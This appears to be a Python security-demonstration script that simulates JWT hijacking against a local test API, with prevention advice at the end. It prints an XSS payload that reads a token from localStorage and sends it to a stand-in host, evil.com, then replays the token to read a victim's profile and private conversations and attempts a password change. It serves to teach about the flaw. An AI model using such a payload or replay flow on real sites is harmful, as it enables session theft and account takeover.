"""
JWT Token Hijacking - Gerçek Saldırı Demo
XSS ile token çalma + Inject etme simülasyonu
"""

import requests
from colorama import init, Fore, Style
import time

init()

BASE_URL = "http://localhost:8000/api"

def print_banner():
    print(f"""
{Fore.RED}
╔═══════════════════════════════════════════════════════╗
║   🔴 JWT TOKEN HIJACKING - REAL ATTACK DEMO          ║
║   Session Theft & Account Takeover                   ║
╚═══════════════════════════════════════════════════════╝
{Style.RESET_ALL}
""")

def scenario_token_theft():
    """Gerçek token çalma senaryosu"""
    
    print(f"{Fore.YELLOW}{'═' * 70}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}SCENARIO: JWT TOKEN THEFT VIA XSS{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}{'═' * 70}{Style.RESET_ALL}\n")
    
    # VICTIM: Alice normal login yapıyor
    print(f"{Fore.CYAN}[VICTIM] Alice login oluyor...{Style.RESET_ALL}\n")
    
    # Alice register
    alice_user = f"alice_victim_{int(time.time())}"
    requests.post(f"{BASE_URL}/auth/register", json={
        "username": alice_user,
        "email": f"{alice_user}@test.com",
        "password": "Alice123!",
        "full_name": "Alice Victim"
    })
    
    # Alice login
    alice_login = requests.post(f"{BASE_URL}/auth/login", json={
        "username": alice_user,
        "password": "Alice123!"
    })
    
    alice_token = alice_login.json()["access_token"]
    alice_data = alice_login.json()["user"]
    
    print(f"✅ Alice logged in")
    print(f"   Username: {alice_data['username']}")
    print(f"   User ID: {alice_data['id']}")
    print(f"   Token stored in localStorage\n")
    
    # Alice creates conversation (private data)
    print(f"{Fore.CYAN}[VICTIM] Alice creates private conversation...{Style.RESET_ALL}\n")
    
    headers = {"Authorization": f"Bearer {alice_token}"}
    conv_resp = requests.post(f"{BASE_URL}/conversations", 
                              headers=headers,
                              json={"title": "Alice's Secret Plans"})
    
    if conv_resp.status_code == 201:
        print(f"✅ Private conversation created")
        print(f"   Title: 'Alice's Secret Plans'\n")
    
    # Simulate time passing
    time.sleep(1)
    
    # ATTACKER: XSS saldırısı ile token çalıyor
    print(f"{Fore.RED}{'─' * 70}{Style.RESET_ALL}")
    print(f"{Fore.RED}[ATTACKER] XSS Attack - Stealing Token from localStorage{Style.RESET_ALL}")
    print(f"{Fore.RED}{'─' * 70}{Style.RESET_ALL}\n")
    
    print(f"{Fore.YELLOW}XSS Payload:{Style.RESET_ALL}")
    print(f'''
<script>
  // Steal token from localStorage
  const token = localStorage.getItem('token');
  
  // Send to attacker's server
  fetch('http://evil.com/steal', {{
    method: 'POST',
    body: JSON.stringify({{ token: token }})
  }});
</script>
''')
    
    print(f"\n{Fore.RED}🔴 Token intercepted!{Style.RESET_ALL}")
    print(f"   Stolen token: {alice_token[:50]}...\n")
    
    # ATTACKER: Çalınan token ile Alice'in hesabına giriyor
    print(f"{Fore.RED}{'─' * 70}{Style.RESET_ALL}")
    print(f"{Fore.RED}[ATTACKER] Using Stolen Token - Account Takeover{Style.RESET_ALL}")
    print(f"{Fore.RED}{'─' * 70}{Style.RESET_ALL}\n")
    
    # Attacker uses stolen token
    print(f"[1] Accessing victim's profile...")
    
    attacker_headers = {"Authorization": f"Bearer {alice_token}"}  # Çalınan token!
    profile_resp = requests.get(f"{BASE_URL}/users/me", headers=attacker_headers)
    
    if profile_resp.status_code == 200:
        victim_data = profile_resp.json()
        print(f"   {Fore.RED}✅ SUCCESS! Accessed victim's profile{Style.RESET_ALL}")
        print(f"   Username: {victim_data['username']}")
        print(f"   Email: {victim_data['email']}")
        print(f"   ID: {victim_data['id']}\n")
    
    # Attacker reads conversations
    print(f"[2] Reading victim's private conversations...")
    
    convs_resp = requests.get(f"{BASE_URL}/conversations", headers=attacker_headers)
    
    if convs_resp.status_code == 200:
        conversations = convs_resp.json()
        print(f"   {Fore.RED}✅ SUCCESS! Read private data{Style.RESET_ALL}")
        for conv in conversations:
            print(f"   - {conv['title']}\n")
    
    # Attacker can even change password!
    print(f"[3] Attempting to change victim's password...")
    
    change_pw_resp = requests.post(f"{BASE_URL}/users/change-password", 
                                    headers=attacker_headers,
                                    json={
                                        "current_password": "dummy",  # Attacker doesn't know
                                        "new_password": "HACKED123!"
                                    })
    
    if change_pw_resp.status_code == 200:
        print(f"   {Fore.RED}🔴 CRITICAL! Password changed!{Style.RESET_ALL}")
        print(f"   New password: HACKED123!")
        print(f"   Alice is now locked out!\n")
    elif change_pw_resp.status_code == 400:
        print(f"   {Fore.YELLOW}⚠️  Password change failed (needs current password){Style.RESET_ALL}")
        print(f"   But attacker still has full read access!\n")
    
    # Summary
    print(f"{Fore.RED}{'═' * 70}{Style.RESET_ALL}")
    print(f"{Fore.RED}ATTACK SUMMARY{Style.RESET_ALL}")
    print(f"{Fore.RED}{'═' * 70}{Style.RESET_ALL}\n")
    
    print(f"{Fore.RED}🔴 ACCOUNT TAKEOVER SUCCESSFUL!{Style.RESET_ALL}\n")
    
    print(f"What attacker gained:")
    print(f"  ✅ Full access to Alice's account")
    print(f"  ✅ Read all private data (conversations)")
    print(f"  ✅ Can act as Alice for 2 hours (token TTL)")
    print(f"  ✅ Can delete data, send messages, etc.\n")
    
    print(f"{Fore.YELLOW}How it happened:{Style.RESET_ALL}")
    print(f"  1. XSS vulnerability allowed script injection")
    print(f"  2. Token stored in localStorage (not HttpOnly cookie)")
    print(f"  3. No token binding (same token works from any IP)")
    print(f"  4. No refresh token mechanism\n")
    
    print(f"{Fore.GREEN}How to prevent:{Style.RESET_ALL}")
    print(f"  1. ✅ Fix XSS vulnerabilities (input sanitization)")
    print(f"  2. ✅ Use HttpOnly cookies instead of localStorage")
    print(f"  3. ✅ Implement token binding (IP/User-Agent check)")
    print(f"  4. ✅ Add refresh token rotation")
    print(f"  5. ✅ Implement logout/token revocation")
    print(f"  6. ✅ Monitor for suspicious activity")

if __name__ == "__main__":
    print_banner()
    
    print(f"{Fore.YELLOW}⚠️  This is a security demonstration!{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}   Showing how JWT hijacking works{Style.RESET_ALL}\n")
    
    input("Press Enter to start attack simulation...\n")
    
    scenario_token_theft()
    
    print(f"\n{Fore.CYAN}✅ Demo complete!{Style.RESET_ALL}\n")
